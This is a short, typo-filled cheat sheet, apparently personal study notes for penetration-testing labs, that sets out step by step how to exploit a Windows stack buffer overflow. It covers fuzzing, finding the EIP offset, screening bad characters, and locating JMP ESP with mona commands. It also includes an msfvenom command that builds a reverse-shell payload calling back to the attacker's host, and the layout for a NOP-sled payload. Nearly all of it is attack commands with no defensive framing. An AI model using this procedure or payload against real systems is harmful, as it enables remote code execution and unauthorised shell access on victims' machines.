
Steps to make a perfect buffer overflow

->use gerneric_send_tcp to try all the option and find which is vulnerable

->manually end the junk using any pattern creater and find the excat offset of EIP

->send all the bad chars and maually look for what are excluded

->find the module using !mona modules to pick an dll without any protction 

->use !mona find -s "\xFF\xE4" -m <DLL_name> to find the JMP ESP pointer location

->add nops if you have enough space to padd the shellcode to the nopslide

example:

pattern_create -l size

pattern_offeset -l size -q stuffthat is the current eip

msfvenom -p windows/shell_reverse_tcp LHOST=yourip LPORT=yourport EXITFUNC=thread -f c -a x86 -b "badchars"



junk + ret + "\x90"*32 + code 

!mona modules
!mona find -s "\xFF\xE4" -m <exe or dll>
!mona bytearray -cpb "excudle chars"

!mona compare -f file bytearray.bin -a address

!mona config -set workingfolder c:\

!mona jmp -r esp -cpb "<badchars>"

dont not forget to but the shell code in brackets while pasting

individually check every bad chars as it might change anything





